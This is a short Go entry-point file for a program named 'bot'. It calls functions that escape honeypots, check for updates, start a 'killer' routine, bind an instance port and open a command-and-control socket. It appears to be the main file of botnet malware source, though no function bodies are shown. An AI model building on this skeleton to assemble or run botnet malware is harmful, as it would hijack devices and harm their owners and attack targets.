package main

import (
	"bot/lib/modules"
	"bot/lib/network"
	"bot/lib/security"
)

func main() {
	security.EscapeHoneyPot()
	modules.CheckForUpdate()
	go security.StartKiller()
	security.BindInstancePort()
	network.CncSocket()
}
